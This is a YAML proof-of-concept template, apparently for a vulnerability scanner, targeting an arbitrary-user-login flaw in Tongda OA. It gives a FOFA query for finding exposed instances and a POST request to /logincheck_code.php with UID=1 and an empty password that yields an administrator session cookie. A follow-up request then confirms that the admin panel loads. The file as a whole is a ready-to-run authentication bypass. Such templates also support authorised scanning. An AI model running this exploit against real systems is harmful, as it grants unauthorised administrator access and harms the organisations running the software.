id: poc-yaml-tongda-oa-anyuser-login
info:
  name: 通达OA 任意用户登录漏洞
  severity: high
  tags:
  - 两高一弱
  - 权限绕过
  finger: 通达OA
  fofa: body="Office Anywhere 2017版 网络智能办公系统"
requests:
- method: POST
  path: /logincheck_code.php
  headers:
    Content-type: application/x-www-form-urlencoded
  data: UNAME=admin&PASSWORD=&encode_type=1&UID=1
  expression: status_code == 200
  output:
  - regex_match(headers,"PHPSESSID=(?P<cookie>.*?);")
- method: GET
  path: /general/index.php?is_modify_pwd=1
  headers:
    Cookie: PHPSESSID={{.cookie}}
  expression: "status_code == 200 && \n(\ncontains(gbk_decode(body),\"\\\"admin\\\"\
    \") &&\ncontains(gbk_decode(body),\"\\\"系统管理员\\\"\") &&\ncontains(gbk_decode(body),\"\
    快捷菜单\")\n) || (\ncontains(body,\"\\\"admin\\\"\") &&\ncontains(body,\"\\\"系统管理员\\\
    \"\") &&\ncontains(body,\"快捷菜单\")\n)\n"
variables: {}
transport: http
